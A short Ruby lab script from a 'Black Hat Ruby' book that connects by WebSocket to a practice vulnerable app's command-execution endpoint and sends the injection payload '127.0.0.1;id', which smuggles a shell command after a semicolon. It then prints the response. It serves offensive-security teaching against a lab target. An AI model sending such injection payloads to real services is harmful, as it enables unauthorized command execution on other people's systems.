#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Sending WebSocket Request
# Requirements:
#   gem install faye-websocket
#
require 'faye/websocket'
require 'eventmachine'

EventMachine.run {
  ws = Faye::WebSocket::Client.new('ws://dvws.local:8080/command-execution')

  # fires when the socket connection is established.
  ws.on :open do |event|
    puts "[*] open!"
    # accepts either a String or an Array of byte-sized integers and sends a text or binary message over the connection to the other peer; binary data must be encoded as an Array.
    puts "[*] sending evil message!"
    ws.send('127.0.0.1;id'.bytes)
  end

  puts "[*] ping!"
  ws.ping('Howdy from Ruby') do
    puts "[*] pong!"
    puts "[+] WebSocket Protocol version"
    puts ws.version
  end

  # fires when there is a protocol error due to bad data sent by the other peer.
  ws.on :error do |event|
    puts "[*] error!"
    pp event
  end

  # fires when the socket receives a message.
  ws.on :message do |event|
    puts "[+] message!"
    puts event.data

    # closes the connection, sending the given status code and reason text, both of which are optional.
    ws.close(1000, "I've got what I want!")
  end

  # fires when either the client or the server closes the connection.
  ws.on :close do |event|
    puts "[*] closed!"
    pp [:close, event.code, event.reason]
    ws = nil
    EventMachine.stop
  end
}